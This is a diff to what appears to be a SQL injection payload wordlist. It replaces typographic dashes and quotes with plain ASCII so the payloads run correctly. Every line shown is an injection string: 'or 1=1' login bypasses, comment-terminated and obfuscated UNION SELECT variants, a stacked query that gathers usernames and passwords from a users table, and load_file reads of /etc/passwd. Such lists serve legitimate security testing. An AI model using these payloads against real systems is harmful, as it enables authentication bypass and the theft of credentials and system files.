@@ -69,9 +69,9 @@ or 1=1 #'
 or 1=1
 'or 1=1
 "or 1=1
-or 1=1–
-'or 1=1–
-"or 1=1–
+or 1=1-
+'or 1=1-
+"or 1=1-
 or 1=1#
 'or 1=1#
 "or
@@ -84,21 +84,21 @@ or 1=1;%00
 "or 1=1;%00
 'or'
 'or
-'or'–
-'or–
+'or'-
+'or-
 or a=a
 'or a=a
 "or a=a
-or a=a–
-'or a=a —
-"or a=a–
+or a=a-
+'or a=a -
+"or a=a-
 or 'a'='a'
 'or 'a'='a'
 "or 'a'='a'
 ')or('a'='a'
-")”a”=”a”
+")"a"="a"
 ')'a'='a
-'or”='
+'or"='
 '||(elt(-3+5,bin(15),ord(10),hex(char(45))))
 ||6
 '||'6
@@ -150,7 +150,6 @@ UNI/**/ON SEL/**/ECT
 %27+--+&password=
 '; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >
  @var select @var as var into temp end --
- 
 ' and 1 in (select var from temp)--
 ' union select 1,load_file('/etc/passwd'),1,1,1;
 1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
